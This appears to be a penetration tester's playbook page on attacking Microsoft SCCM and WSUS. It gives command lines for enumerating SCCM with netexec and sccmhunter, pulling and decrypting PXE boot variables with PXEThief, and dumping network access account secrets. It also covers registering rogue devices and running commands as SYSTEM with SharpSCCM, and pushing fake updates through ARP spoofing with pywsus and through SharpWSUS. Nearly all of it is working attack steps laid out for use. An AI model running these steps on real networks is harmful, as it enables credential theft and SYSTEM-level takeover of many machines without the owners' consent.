# SCCM and WSUS

## Before I start
At the pwn-broker prompt: tool install netexec.
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M sccm
sccmhunter, from https://github.com/garrettfoster13/sccmhunter:
pipx install git+https://github.com/garrettfoster13/sccmhunter/
sccmhunter find -u '<Username>' -p '<Password>' -d '<Domain>' -dc-ip <DCIP>
sccmhunter smb -u '<Username>' -p '<Password>' -d '<Domain>' -dc-ip <DCIP> -save
- [ ] The site servers, management points and distribution points, and with -save any PXE boot variables files they serve

## SCCM: PXE and boot media
PXEThief, from https://github.com/MWR-CyberSec/PXEThief, needs pywin32, so it runs on a Windows host of mine on the same network, not on Kali. With <TargetIP> the distribution point:
python pxethief.py 2 <TargetIP>
python pxethief.py 3 THE-VARIABLES-FILE THE-MEDIA-PASSWORD
python pxethief.py 5 THE-VARIABLES-FILE
- [ ] 2 asks that distribution point for a PXE boot and downloads the media variables file; 1 finds a distribution point by DHCP instead
- [ ] 3 decrypts a variables file with the media password and reads the secrets from the site; 5 prints the file as a hash to crack, for a password that is not blank
- [ ] The media and its policies carry the network access account, task sequence credentials and the domain join account
- [ ] The network access account is also on every SCCM client, in WMI's CCM_NetworkAccessAccount, protected with the machine's DPAPI key: :Pb dpapi

## SCCM: with a login
SharpSCCM.exe, from https://github.com/Mayyhem/SharpSCCM/releases, on a domain host:
.\SharpSCCM.exe local secrets -m wmi
.\SharpSCCM.exe get secrets -r THE-NEW-DEVICE -u '<Computer>' -p 'THE-COMPUTER-PASSWORD'
.\SharpSCCM.exe exec -n 'THE-COLLECTION' -p 'THE-COMMAND' -s
- [ ] local secrets needs local administrator on a client; -m disk also finds secrets that were changed or deleted
- [ ] get secrets registers a new device with a computer account's name and password, such as one I created in :Pb machine-account-abuse, and asks a management point for the secrets in its policies: the network access account, collection variables and task sequences
- [ ] exec needs an SCCM administrator role: it deploys a command to one device with -d, or to a whole collection with -n, and -s runs it as SYSTEM

## WSUS over plain HTTP
- [ ] Not on the OSCP exam: OffSec bans spoofing, including NBNS, and Responder poisoning
- [ ] A client whose update server is an http:// address: reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
- [ ] With ARP spoofing, from bettercap, I sit between that client and its WSUS server, and my server answers its update check
pywsus, from https://github.com/GoSecure/pywsus, with PsExec64.exe from Sysinternals, https://learn.microsoft.com/sysinternals/downloads/psexec, beside it:
git clone https://github.com/GoSecure/pywsus
python3 -m venv pywsus/venv
pywsus/venv/bin/pip install -r pywsus/requirements.txt
pywsus/venv/bin/python pywsus/pywsus.py -H <LHOST> -p 8530 -e PsExec64.exe -c '/accepteula /s cmd.exe /c "THE-COMMAND"'
- [ ] -H is the address pywsus listens on, which is mine; -e must be a binary that Microsoft signed, and -c is its arguments
- [ ] The client installs the update as SYSTEM at its next check

## WSUS: as an administrator of the WSUS server
SharpWSUS, built from https://github.com/nettitude/SharpWSUS, which publishes no binary, run on the WSUS server:
.\SharpWSUS.exe inspect
.\SharpWSUS.exe create /payload:"C:\Users\Public\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c THE-COMMAND" /title:"THE-TITLE"
.\SharpWSUS.exe approve /updateid:THE-UPDATE-ID /computername:<Hostname>.<Domain> /groupname:"THE-GROUP"
.\SharpWSUS.exe check /updateid:THE-UPDATE-ID /computername:<Hostname>.<Domain>
.\SharpWSUS.exe delete /updateid:THE-UPDATE-ID /computername:<Hostname>.<Domain> /groupname:"THE-GROUP"
- [ ] create prints THE-UPDATE-ID; the payload must be a binary that Microsoft signed, such as PsExec
- [ ] The client installs it as SYSTEM at its next check; delete takes the update and the group away afterwards

## If it fails
- [ ] PXE wants a certificate as well as the variables file, with Enhanced HTTP or PKI: a client's certificate instead
- [ ] WSUS on HTTPS: no man in the middle, so the WSUS server itself, as any Windows host
- [ ] SharpSCCM exec refused: my user holds no SCCM role, and the secrets commands need none

## Next
- [ ] The network access account and task sequence credentials: a domain login, :Pb domain-enum
- [ ] SYSTEM on many hosts: :Pb windows-creds
